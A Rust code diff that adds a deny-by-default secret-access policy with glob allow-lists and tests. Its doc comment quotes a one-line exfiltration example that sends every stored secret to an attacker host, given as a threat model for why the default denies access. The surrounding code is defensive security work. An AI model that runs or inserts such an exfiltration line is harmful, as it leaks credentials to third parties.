@@ -203,6 +203,94 @@ impl NetworkPolicy {
     }
 }
 
+/// Secret access policy for functions.
+///
+/// Gates `raisin.secrets.*` exactly the way [`NetworkPolicy`] gates
+/// `raisin.http.fetch`: an `enabled` switch plus a glob allow-list, both
+/// `#[serde(default)]` so an omitted `secret_policy` block yields **no access
+/// at all**.
+///
+/// # Why deny-by-default matters more here than anywhere else
+///
+/// Virtual-node adapters run privileged — row-level security is bypassed for
+/// them — and they hold `raisin.http`. A secrets binding that defaulted to
+/// "read anything" would therefore be a one-line exfiltration path for every
+/// credential in the repo: `raisin.http.fetch(attacker, { body:
+/// raisin.secrets.list().map(s => raisin.secrets.get(s.name)) })`. The allow-list
+/// is what keeps a compromised or careless adapter confined to the credentials
+/// it was actually granted, and `enabled: false` (the default) is what keeps
+/// every function that never asked for secrets from having them.
+///
+/// A function opts in from its `.node.yaml`:
+///
+/// ```yaml
+/// secret_policy:
+///   enabled: true
+///   allowed_names:
+///     - "stripe/*"
+///     - "sendgrid_api_key"
+/// ```
+#[derive(Debug, Clone, Default, Serialize, Deserialize)]
+pub struct SecretPolicy {
+    /// Whether this function may touch the secret store at all.
+    ///
+    /// `false` (the default) denies every `raisin.secrets.*` call.
+    #[serde(default)]
+    pub enabled: bool,
+
+    /// Allowlisted secret-name patterns (glob-style), e.g. `"stripe/*"`.
+    ///
+    /// An empty list denies everything even when `enabled` is true — the same
+    /// rule [`NetworkPolicy::is_url_allowed`] applies to `allowed_urls`, so
+    /// "enabled but unconfigured" can never mean "unrestricted".
+    #[serde(default)]
+    pub allowed_names: Vec<String>,
+}
+
+impl SecretPolicy {
+    /// A policy that allows no secret access. Identical to [`Default`]; named
+    /// so a call site can say what it means.
+    pub fn no_secrets() -> Self {
+        Self::default()
+    }
+
+    /// A policy allowing exactly the given name patterns.
+    pub fn allow_names(names: Vec<String>) -> Self {
+        Self {
+            enabled: true,
+            allowed_names: names,
+        }
+    }
+
+    /// Add one allowed name pattern (enabling the policy).
+    pub fn with_allowed_name(mut self, pattern: impl Into<String>) -> Self {
+        self.enabled = true;
+        self.allowed_names.push(pattern.into());
+        self
+    }
+
+    /// Whether `name` is allowed by this policy.
+    ///
+    /// Uses the same `glob::Pattern` matcher as
+    /// [`NetworkPolicy::is_url_allowed`] — one glob implementation, so an
+    /// operator's mental model of `*` is the same in both policies.
+    pub fn is_name_allowed(&self, name: &str) -> bool {
+        if !self.enabled {
+            return false;
+        }
+
+        if self.allowed_names.is_empty() {
+            return false;
+        }
+
+        self.allowed_names.iter().any(|pattern| {
+            glob::Pattern::new(pattern)
+                .map(|p| p.matches(name))
+                .unwrap_or(false)
+        })
+    }
+}
+
 #[cfg(test)]
 mod tests {
     use super::*;
@@ -227,5 +315,40 @@ mod tests {
     fn test_no_network_policy() {
         let policy = NetworkPolicy::no_network();
         assert!(!policy.is_url_allowed("https://api.example.com/anything"));
+    }
+
+    #[test]
+    fn secret_policy_denies_by_default() {
+        let policy = SecretPolicy::default();
+        assert!(!policy.enabled);
+        assert!(!policy.is_name_allowed("anything"));
+
+        // The shape a function node with no `secret_policy` block deserializes
+        // to must be the denying one, not an empty-but-permissive one.
+        let from_empty: SecretPolicy = serde_json::from_value(serde_json::json!({})).unwrap();
+        assert!(!from_empty.is_name_allowed("stripe_key"));
+    }
+
+    #[test]
+    fn secret_policy_enabled_without_names_still_denies() {
+        let policy = SecretPolicy {
+            enabled: true,
+            allowed_names: Vec::new(),
+        };
+        assert!(!policy.is_name_allowed("stripe_key"));
+    }
+
+    #[test]
+    fn secret_policy_matches_globs() {
+        let policy =
+            SecretPolicy::allow_names(vec!["stripe/*".to_string(), "sendgrid_api_key".to_string()]);
+
+        assert!(policy.is_name_allowed("stripe/live"));
+        assert!(policy.is_name_allowed("stripe/test"));
+        assert!(policy.is_name_allowed("sendgrid_api_key"));
+
+        assert!(!policy.is_name_allowed("stripe"));
+        assert!(!policy.is_name_allowed("twilio/token"));
+        assert!(!policy.is_name_allowed("sendgrid_api_key_2"));
     }
 }
